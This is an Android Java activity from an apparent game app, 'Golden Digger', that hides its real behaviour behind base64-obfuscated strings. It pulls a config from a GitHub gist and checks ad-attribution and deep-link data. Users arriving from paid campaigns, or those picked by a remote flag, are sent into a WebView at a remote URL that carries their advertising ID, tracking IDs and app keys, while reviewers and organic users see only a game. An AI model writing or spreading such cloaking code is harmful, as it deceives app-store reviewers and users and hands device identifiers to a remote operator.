package com.goldn.diggr;

import static com.goldn.diggr.GAMCDActivity.parserGD;
import static com.goldn.diggr.LogCD.decode;
import static com.goldn.diggr.LogCD.rrr;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.widget.TextView;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;
import com.onesignal.OneSignal;
import com.sanojpunchihewa.glowbutton.GlowButton;
import com.tt.whorlviewlibrary.WhorlView;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Map;

public class GD extends AppCompatActivity {
    GlowButton bu2, bu1, buIn;
    TextView textViewIN;
    WhorlView whorlView;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.gd);
        whorlView = (WhorlView) this.findViewById(R.id.whorl2);
        whorlView.start();
        bu1 = findViewById(R.id.bu1);
        bu2 = findViewById(R.id.bu2);
        buIn = findViewById(R.id.buIn);
        textViewIN = findViewById(R.id.textViewIN);
        GAMCDActivity.gd = this;

        buIn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(new Intent(getApplicationContext(), GD.class));
                finishAffinity();
            }
        });

        bu1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(new Intent(getApplicationContext(), LogCD.class));
                finishAffinity();
            }
        });

        bu2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                finishAffinity();
            }
        });

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    mmjds = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (GooglePlayServicesNotAvailableException e) {
                    e.printStackTrace();
                } catch (GooglePlayServicesRepairableException e) {
                    e.printStackTrace();
                }
            }
        }).start();

        dsja = AppsFlyerLib.getInstance().getAppsFlyerUID(this);

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId("fafe4191-1c07-4784-90f8-34536826098c");

        startAppGD();
        startGD();
    }

    public static String dsja;
    public static String jcsha = "-";
    public static String mmjds;
    public static String nvhdsus;
    public static String chsaus = "DZTbfcEMP2FxrLMsnbaaE";
    public static String csha;
    public static String nhsfsa;
    public static String hsafsa;
    public void startAppGD(){

        AppsFlyerLib.getInstance().init(chsaus, new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> map) {

                jcsha = map.get(decode("YWZfc3RhdHVz")).toString();

                if (jcsha.equals(decode("Tm9uLW9yZ2FuaWM="))){

                    try {
                        csha = map.get(decode("Y2FtcGFpZ24=")).toString();
                    }catch (Exception e){

                    }

                    try {

                        nhsfsa = map.get(decode("bWVkaWFfc291cmNl")).toString();
                    }catch (Exception e){

                    }

                    try {

                        hsafsa = map.get(decode("YWZfY2hhbm5lbA==")).toString();
                    }catch (Exception e){

                    }

                    nvhdsus = GAMCDActivity.parserGD(csha);

                }

            }

            @Override
            public void onConversionDataFail(String s) {

            }

            @Override
            public void onAppOpenAttribution(Map<String, String> map) {

            }

            @Override
            public void onAttributionFailure(String s) {

            }
        },this);
        AppsFlyerLib.getInstance().start(this);

    }


    public void gameGD(){
        bu1.setVisibility(View.VISIBLE);
        bu2.setVisibility(View.VISIBLE);
        whorlView.setVisibility(View.INVISIBLE);
    }

    public void startGD() {

        if (sdsa()) {
            if (rrr){
                gameGD();
            }else {
                ii();
            }

        } else {
            textViewIN.setVisibility(View.VISIBLE);
            buIn.setVisibility(View.VISIBLE);
            whorlView.setVisibility(View.INVISIBLE);
        }
    }


    private boolean sdsa() {
        String csjaie = Context.CONNECTIVITY_SERVICE;
        ConnectivityManager cshsdp = (ConnectivityManager) getSystemService(csjaie);
        if (cshsdp.getActiveNetworkInfo() == null) {
            return false;
        } else {
            return true;
        }
    }

    public static String sgacs;
    public static String cayyc;
    public static String cagcta;
    public static String cstsca;
    private void ii() {
        String ss = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(decode("c2F2ZWRVcmw="), decode("bnVsbA=="));
        if (ss.equals(decode("bnVsbA=="))) {

            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(decode("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9BcnR1cjE5OTMyNC81MWY0Yzc0NGQwNGFlYmZiYzljMzU5MGY1YzMwYmI3Mi9yYXcvR29sZGVuRGlnZ2Vy")).openConnection();
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                        sgacs = bufferedReader.readLine();
                        cayyc = bufferedReader.readLine();
                        cagcta = bufferedReader.readLine();
                        cstsca = bufferedReader.readLine();

                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                deepStGD(cstsca);
                                deepLinkGD();
                                staGD();
                            }
                        });
                    }catch (Exception e){

                    }
                }
            }).start();

        } else {
            stWebGD(ss);
        }
    }

    int aaaa = 0;
    public void staGD(){

        Handler cacewq = new Handler();
        cacewq.post(new Runnable() {
            @Override
            public void run() {

                if (!jcsha.equals("-") || !oihhds.equals("-")) {
                    if (jcsha.equals(decode("Tm9uLW9yZ2FuaWM="))) {
                        String load = cayyc + nvhdsus;
                        getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(decode("c2F2ZWRVcmw="), load).apply();
                        stWebGD(load);

                        aaaa = 1;
                    } else if (csacfrwq != null) {
                        String load = cayyc + oihhds;
                        getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(decode("c2F2ZWRVcmw="), load).apply();
                        stWebGD(load);
                        aaaa = 1;

                    } else {
                        if (sgacs.equals("0")) {

                            bu1.setVisibility(View.VISIBLE);
                            bu2.setVisibility(View.VISIBLE);
                            whorlView.setVisibility(View.INVISIBLE);
                            aaaa = 1;
                        } else {

                           String load = cayyc + decode("P21lZGlhX3NvdXJjZT1vcmdhbmlj") +
                                    decode("Jmdvb2dsZV9hZGlkPQ==") + mmjds +
                                    decode("JmFmX3VzZXJpZD0=") + dsja +
                                    decode("JmRldl9rZXk9") + chsaus +
                                    decode("JmJ1bmRsZT0=") + getPackageName() +
                                    decode("JmZiX2FwcF9pZD0=") + cstsca +
                                    decode("JmZiX2F0PQ==") + cagcta;
                            getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(decode("c2F2ZWRVcmw="), load).apply();
                            stWebGD(load);
                            aaaa = 1;
                        }
                    }

                } else {

                }


                if (aaaa != 1){
                   cacewq.postDelayed(this::run,500);
                }
            }
        });
    }

    public static String csacfrwq = null;
    public static String oihhds = "-";
    public void deepStGD(String iugd){
        FacebookSdk.setApplicationId(iugd);
        FacebookSdk.setAdvertiserIDCollectionEnabled(true);
        FacebookSdk.sdkInitialize(getApplicationContext());
        FacebookSdk.fullyInitialize();
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.setAutoLogAppEventsEnabled(true);
    }

    public void deepLinkGD(){

        AppEventsLogger.activateApp(getApplication());
        AppLinkData.fetchDeferredAppLinkData(getApplicationContext(), new AppLinkData.CompletionHandler() {
            @Override
            public void onDeferredAppLinkDataFetched(@Nullable AppLinkData iuhg) {
                if (iuhg == null) {
                    iuhg = AppLinkData.createFromActivity(GD.this);

                }
                if (iuhg != null) {

                    String[] as = iuhg.getTargetUri().toString().split("://");
                    csacfrwq = as[1];
                    oihhds = parserGD(csacfrwq);

                } else {

                }
            }
        });
    }
    public void stWebGD(String sss){
       Intent intent = new Intent(getApplicationContext(),WebGD.class);
       intent.putExtra("lood",sss);
       startActivity(intent);
       finishAffinity();
    }
}
